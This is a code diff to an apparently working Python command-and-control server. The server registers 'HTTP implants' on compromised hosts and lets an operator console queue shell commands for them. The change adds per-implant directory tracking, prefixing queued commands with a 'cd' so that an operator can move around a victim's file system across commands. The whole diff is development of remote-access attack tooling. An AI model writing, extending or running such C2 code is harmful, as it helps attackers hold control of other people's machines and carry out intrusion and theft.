@@ -6,6 +6,7 @@ import threading
 import sys
 import time
 import re
+import os
 from select import select
 
 # --- Configuration ---
@@ -38,7 +39,7 @@ class C2Handler(http.server.BaseHTTPRequestHandler):
         path = self.path.strip("/")
         with global_lock:
             if uid not in http_sessions:
-                http_sessions[uid] = {"last_cmd": "None", "output": "", "last_seen": time.time()}
+                http_sessions[uid] = {"last_cmd": "None", "output": "", "last_seen": time.time(), "cwd": None}
                 sys.stdout.write(f"\r[+] New HTTP implant registered: {uid}\nC2 > ")
                 sys.stdout.flush()
             http_sessions[uid]["last_seen"] = time.time()
@@ -241,7 +242,26 @@ def c2_console():
                 uid = current_session[1]
                 with global_lock:
                     if uid in http_sessions:
-                        http_sessions[uid]['last_cmd'] = cmd_input
+                        if cmd_input.startswith("cd"):
+                            parts = cmd_input.split(maxsplit=1)
+                            new_dir = None
+                            if len(parts) == 1:
+                                http_sessions[uid]['cwd'] = None
+                            else:
+                                arg = parts[1].strip()
+                                if ((arg.startswith('"') and arg.endswith('"')) or (arg.startswith("'") and arg.endswith("'"))):
+                                    arg = arg[1:-1]
+                                current_cwd = http_sessions[uid].get('cwd')
+                                if arg.startswith('/'):
+                                    new_dir = os.path.normpath(arg)
+                                else:
+                                    base_dir = current_cwd if current_cwd else "."
+                                    new_dir = os.path.normpath(os.path.join(base_dir, arg))
+                                http_sessions[uid]['cwd'] = new_dir
+                        else:
+                            cwd = http_sessions[uid].get('cwd')
+                            to_send = f'cd "{cwd}" && {cmd_input}' if cwd else cmd_input
+                            http_sessions[uid]['last_cmd'] = to_send
                     else:
                         print(f"[!] HTTP implant {uid} is no longer active.")
                         current_session = None
